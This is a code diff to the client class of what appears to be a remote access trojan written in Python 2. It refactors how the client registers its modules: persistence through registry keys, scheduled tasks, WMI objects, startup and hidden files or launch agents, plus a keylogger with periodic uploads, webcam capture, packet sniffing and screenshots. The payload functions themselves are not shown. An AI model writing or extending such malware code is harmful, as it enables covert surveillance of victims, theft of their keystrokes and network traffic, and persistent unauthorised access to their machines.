@@ -373,26 +373,43 @@ class Client(object):
     def _module(fx, cx=__command__, mx=__modules__):
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
-            fx.options = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
+            fx.options   = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+            cx.update({fx.func_name: fx})
 
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
-            fx.options = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
+            fx.options   = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+            cx.update({fx.func_name: fx})
 
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
-            fx.options = {'image': True, 'video': bool()}
+            fx.options   = {'image': True, 'video': bool()}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+            cx.update({fx.func_name: fx})
 
         elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
-            fx.options  = { 'next_upload': time.time() + 300.0, 'buffer': []}
+            fx.options   = { 'next_upload': time.time() + 300.0, 'buffer': []}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+            cx.update({fx.func_name: fx})
 
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
-            fx.options = {}
-        fx.status = True if sys.platform in fx.platforms else False
-        mx.update({fx.func_name: fx})
-        cx.update({fx.func_name: fx})
+            fx.options   = {}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+            cx.update({fx.func_name: fx})
+
+        else:
+            __command__[fx.func_name] = fx
+            cx.update({fx.func_name: fx})
+
         return fx
 
     def _options(self, *module):
